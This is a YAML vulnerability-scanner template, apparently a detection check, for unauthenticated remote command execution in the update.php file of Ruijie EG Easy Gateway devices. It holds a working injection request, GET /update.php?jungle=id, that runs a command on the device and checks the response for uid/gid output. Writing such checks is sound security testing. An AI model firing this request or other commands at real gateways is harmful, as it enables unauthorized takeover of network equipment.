name: Ruijie_EG_update.php_RCE
transport: http
set: {}
detail:
  dock: body="EG易网关"
  product: Ruijie EWEB
  homepage: https://www.ruijie.com.cn/
  impact: <p>There is a security vulnerability in the update.php file of Ruijie EG
    Easy Gateway, and unauthorized users can execute arbitrary commands.<br></p>
  description: '<p>Ruijie EG Gateway is an efficient wireless gateway device.<br></p><p><span
    style="color: rgb(22, 51, 102); font-size: 16px;">There is a security vulnerability
    in the update.php file of Ruijie EG Easy Gateway, and unauthorized users can execute
    arbitrary commands.</span><br></p>'
rules:
  r1:
    method: GET
    path: /update.php?jungle=id
    follow_redirects: false
    expression: response.status == 200 && response.body.bcontains(b'gid=') && response.body.bcontains(b'uid=')
expression: r1()
